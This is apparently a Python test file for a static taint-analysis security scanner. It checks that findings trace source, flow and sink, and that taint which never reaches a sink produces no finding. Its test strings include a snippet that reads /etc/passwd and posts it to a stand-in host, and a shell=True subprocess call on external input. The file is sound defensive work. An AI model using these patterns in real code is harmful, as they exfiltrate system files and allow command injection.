"""F-055: Cloudflare-style evidence model for taint findings.

Two properties the model wants — both are already provided by the engine, and locked here:

1. Per-finding entrypoint->sink trace: every taint FAIL's reason names the SOURCE kind, the
   flow kind (direct/indirect), and the SINK — a textual source->sink trace that flows into
   the Finding evidence (and thus the human / --json / SARIF message).
2. Disprove-the-finding (FP killer, golden rule #5): a source that does NOT actually reach a
   sink produces NO taint finding — the rules only emit when the tainted value is passed to
   the sink, so there is nothing to "disprove" after the fact.

(A structured trace[] ARRAY in SARIF codeFlow format is a separate, low-value interop
refactor — it needs source-line provenance threaded through the taint engine — and is left
as a deferred follow-up; the substance above is what serves detection + zero-FP.)
"""
from __future__ import annotations

from clawseccheck.skillast import analyze_python


def _find(src: str, rule: str):
    return next((f for f in analyze_python(src, "t.py") if f.rule == rule), None)


def _rules(src: str) -> set[str]:
    return {f.rule for f in analyze_python(src, "t.py")}


# 1. trace evidence — source -> flow -> sink is present in the reason
def test_cmd_injection_reason_traces_source_to_sink():
    f = _find("def f(x):\n    import subprocess\n    subprocess.run(x, shell=True)\n",
              "TT5_CMD_INJECTION")
    assert f is not None
    assert "external input" in f.reason        # source
    assert "flow" in f.reason                    # flow kind
    assert "subprocess.run" in f.reason          # sink


def test_file_exfil_reason_traces_source_to_sink():
    f = _find("import requests\ndef g():\n    d = open('/etc/passwd').read()\n"
              "    requests.post('http://x', data=d)\n", "TT4_FILE_NET")
    assert f is not None
    assert "file-read" in f.reason               # source
    assert "requests.post" in f.reason           # sink


# 2. disprove-inherent — a source that never reaches the sink does not fire
def test_external_input_not_reaching_exec_does_not_fire():
    # x is tainted (param) but never passed to the exec sink -> no TT5.
    assert "TT5_CMD_INJECTION" not in _rules(
        "def f(x):\n    import subprocess\n    y = len(x)\n    subprocess.run(['ls', '-la'])\n")


def test_file_read_not_reaching_network_does_not_fire():
    # the file contents are read but a STATIC body is posted -> no TT4.
    assert "TT4_FILE_NET" not in _rules(
        "import requests\ndef g():\n    d = open('/etc/passwd').read()\n"
        "    requests.post('http://x', data='static')\n")
